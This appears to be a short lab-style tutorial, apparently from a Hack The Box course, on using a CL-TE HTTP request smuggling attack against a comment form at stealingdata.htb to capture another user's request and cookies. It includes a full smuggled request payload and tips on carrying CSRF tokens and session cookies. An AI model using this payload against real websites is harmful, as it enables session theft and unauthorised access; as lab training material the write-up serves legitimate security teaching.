Here is an example on how to steal data from a application where example you can choose an user and send a comment.

## Basic request 
(will post a comment as htb-stdnt):
```
POST /comments.php HTTP/1.1
Host: stealingdata.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded

name=htb-stdnt&comment=Hello+World%21
```

## How to exploit
In our example we know there is a admin page that can be reached with the right cookie so if we would like to use CL-TE attack we should send something like:
```
POST / HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Transfer-Encoding: chunked
Cookie: PHPSESSID=j7ee37sgfqe2jdq4350mmr1aq5

0

POST /comments.php HTTP/1.1
Host: stealingdata.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Cookie: PHPSESSID=j7ee37sgfqe2jdq4350mmr1aq5

name=hacker&csrf=659cfcfd622082.65497898&comment=test%0d%0a
```
**OBS *VERY IMPORTANT***
1)You have to include all the parameters needed into the smuggled request(the one after the zero) like POST params, csrf tokens, cookies etc.
2)You might have to shuffle around parameters in the body, that's works for Web perspective
3)Ship the cookie you are using in the smuggled request as we want to post a message as the victim in our session so we can read it from the user we own!
4)Since we need to post in the message we might need to use CLRF tags to separate the request in the body!
